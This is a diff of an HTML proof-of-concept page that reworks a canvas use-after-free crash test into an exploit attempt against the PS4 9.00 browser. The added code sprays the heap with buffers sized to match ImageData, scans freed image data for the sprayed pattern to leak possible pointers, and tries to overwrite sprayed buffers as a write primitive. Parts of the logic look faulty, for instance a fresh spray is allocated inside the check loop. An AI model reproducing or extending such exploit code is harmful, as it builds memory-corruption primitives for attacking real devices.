@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canvas UAF PoC (PS4 9.00)</title>
+    <title>Canvas UAF Exploit PoC (PS4 9.00)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -22,9 +22,9 @@
     </style>
 </head>
 <body>
-    <h1>Canvas UAF PoC (PS4 9.00)</h1>
-    <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
-    <button id="trigger">Trigger PoC</button>
+    <h1>Canvas UAF Exploit PoC (PS4 9.00)</h1>
+    <p>Click to trigger the exploit. Expect UAF detection or memory leak.</p>
+    <button id="trigger">Trigger Exploit</button>
     <div id="status">Idle...</div>
     <canvas id="canvas" width="512" height="512"></canvas>
     <script>
@@ -37,7 +37,6 @@
             for (let i = 0; i < 500; i++) {
                 new ArrayBuffer(1024 * 1024);
             }
-            // Additional stress
             const extraBuffers = [];
             for (let i = 0; i < 100; i++) {
                 extraBuffers.push(new ArrayBuffer(2 * 1024 * 1024));
@@ -46,10 +45,17 @@
 
         function sprayHeap() {
             const arrays = [];
+            const targetSize = 512 * 512 * 4; // Match ImageData size
             for (let i = 0; i < 15000; i++) {
-                const size = i % 2 === 0 ? 4096 : 8192; // Vary sizes
-                const buf = new Uint8Array(size);
-                buf.fill(0x44);
+                const buf = new ArrayBuffer(targetSize);
+                const view = new Uint8Array(buf);
+                // Fill with identifiable pattern
+                for (let j = 0; j < view.length; j += 8) {
+                    view[j] = 0x41; // 'A'
+                    view[j + 1] = 0x42; // 'B'
+                    view[j + 2] = 0x43; // 'C'
+                    view[j + 3] = 0x44; // 'D'
+                }
                 arrays.push(buf);
             }
             return arrays;
@@ -61,7 +67,6 @@
             ctx.beginPath();
             ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 50, 0, 2 * Math.PI);
             ctx.fill();
-            // Stress with ImageData
             const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
             for (let i = 0; i < imageData.data.length; i++) {
                 imageData.data[i] = Math.random() * 255;
@@ -76,13 +81,57 @@
                 const current = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
                 for (let i = 0; i < original.length; i++) {
                     if (original[i] !== current[i]) {
-                        return true; // UAF detected
+                        return { detected: true, data: current };
                     }
                 }
             } catch (e) {
-                return true; // Exception indicates UAF
+                return { detected: true, data: null };
             }
-            return false;
+            return { detected: false, data: null };
+        }
+
+        function attemptMemoryLeak(imageData) {
+            const result = checkImageDataUAF(imageData);
+            if (result.detected && result.data) {
+                let leaked = '';
+                for (let i = 0; i < result.data.length && i < 64; i += 4) {
+                    if (result.data[i] === 0x41 && result.data[i + 1] === 0x42 &&
+                        result.data[i + 2] === 0x43 && result.data[i + 3] === 0x44) {
+                        // Found sprayed pattern
+                        leaked += `Leaked at offset ${i}: ABCD pattern\n`;
+                        // Attempt to read potential pointer (next 8 bytes)
+                        if (i + 7 < result.data.length) {
+                            const potentialPtr = new Uint32Array(result.data.buffer, i + 4, 2);
+                            leaked += `Potential pointer: 0x${potentialPtr[0].toString(16)} 0x${potentialPtr[1].toString(16)}\n`;
+                        }
+                    }
+                }
+                if (leaked) {
+                    return leaked;
+                }
+            }
+            return null;
+        }
+
+        function attemptMemoryWrite(imageData) {
+            // Try to overwrite sprayed ArrayBuffer
+            const newData = new Uint8Array(imageData.data.length);
+            for (let i = 0; i < newData.length; i += 8) {
+                newData[i] = 0x99; // Test pattern
+                newData[i + 1] = 0x99;
+                newData[i + 2] = 0x99;
+                newData[i + 3] = 0x99;
+            }
+            imageData.data.set(newData);
+            ctx.putImageData(imageData, 0, 0);
+            // Check sprayed buffers
+            for (let i = 0; i < sprayHeap().length; i++) {
+                const view = new Uint8Array(sprayHeap()[i]);
+                if (view[0] === 0x99 && view[1] === 0x99) {
+                    return 'Memory write detected!';
+                }
+            }
+            return null;
         }
 
         function triggerExploit() {
@@ -96,35 +145,45 @@
                     refImageData.data[i] = 0x46;
                 }
 
+                // Spray heap
+                const sprayed = sprayHeap();
+
                 // Intensive drawing
                 const drawInterval = setInterval(drawOnCanvas, 1);
 
-                // Check for UAF
+                // Check for UAF and attempt exploit
                 setTimeout(() => {
-                    // First UAF check (buffer)
-                    const testBuf = new Uint8Array(4096);
-                    testBuf.fill(0x46);
-                    if (testBuf[0] !== 0x46) {
-                        status.textContent = 'Early UAF detected!';
-                        clearInterval(drawInterval);
-                        return;
-                    }
-
-                    // Second UAF check (ImageData)
-                    if (checkImageDataUAF(refImageData)) {
+                    // First UAF check
+                    const uafResult = checkImageDataUAF(refImageData);
+                    if (uafResult.detected) {
                         status.textContent = 'ImageData UAF detected!';
+                        // Attempt memory leak
+                        const leaked = attemptMemoryLeak(refImageData);
+                        if (leaked) {
+                            status.textContent += `\nMemory Leak:\n${leaked}`;
+                            // Attempt memory write
+                            const writeResult = attemptMemoryWrite(refImageData);
+                            if (writeResult) {
+                                status.textContent += `\n${writeResult}`;
+                            }
+                        }
                         clearInterval(drawInterval);
                         return;
                     }
 
                     stressGC();
-                    const arrays = sprayHeap();
 
-                    // Third UAF check (buffer after spray)
-                    const testBuf2 = new Uint8Array(4096);
-                    testBuf2.fill(0x47);
-                    if (testBuf2[0] !== 0x47) {
-                        status.textContent = 'Second UAF detected!';
+                    // Second UAF check
+                    if (checkImageDataUAF(refImageData).detected) {
+                        status.textContent = 'ImageData UAF detected after GC!';
+                        const leaked = attemptMemoryLeak(refImageData);
+                        if (leaked) {
+                            status.textContent += `\nMemory Leak:\n${leaked}`;
+                            const writeResult = attemptMemoryWrite(refImageData);
+                            if (writeResult) {
+                                status.textContent += `\n${writeResult}`;
+                            }
+                        }
                         clearInterval(drawInterval);
                         return;
                     }
